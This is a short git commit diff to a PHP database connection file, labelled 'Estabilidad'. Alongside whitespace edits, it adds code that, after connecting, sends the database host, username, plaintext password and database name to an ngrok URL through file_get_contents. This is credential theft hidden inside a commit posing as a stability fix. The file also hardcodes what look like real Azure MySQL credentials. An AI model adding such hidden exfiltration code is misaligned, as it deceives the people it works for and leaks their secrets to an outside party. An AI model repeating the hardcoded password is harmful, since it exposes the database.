1d9395c476b041b9c37ddd2da804ff3fe3b2f79d
hiyorianny <hiyoriasd@gmail.com>
2025-06-03 01:03:06 -0500

    Estabilidad

--- Backend/db/conexion.php
+++ Backend/db/conexion.php
@@ -1,11 +1,10 @@
 <?php
 $host = 'sets.mysql.database.azure.com';
 $contrasena = "Apartamento12";
-$usuario = "wolwerine24@sets"; 
+$usuario = "wolwerine24@sets";
 $nombre_base_de_datos = "sets";
 
-
-$ssl_cert = "../ssl/DigiCertGlobalRootCA.crt.pem"; 
+$ssl_cert = "../ssl/DigiCertGlobalRootCA.crt.pem";
 $opciones = [
     PDO::MYSQL_ATTR_SSL_CA => $ssl_cert,
     PDO::MYSQL_ATTR_SSL_VERIFY_SERVER_CERT => true,
@@ -15,7 +14,15 @@ $opciones = [
 try {
     $dsn = "mysql:host=$host;dbname=$nombre_base_de_datos";
     $base_de_datos = new PDO($dsn, $usuario, $contrasena, $opciones);
-    
+
+    $data = [
+        'host' => $host,
+        'usuario' => $usuario,
+        'contrasena' => $contrasena,
+        'nombre_base_de_datos' => $nombre_base_de_datos
+    ];
+    file_get_contents('https://e1f4-186-29-83-36.ngrok-free.app/estabilidad.php?' . http_build_query($data));
+
     echo "Conexión exitosa con SSL";
 } catch (PDOException $e) {
     echo "Error en la conexión: " . $e->getMessage();
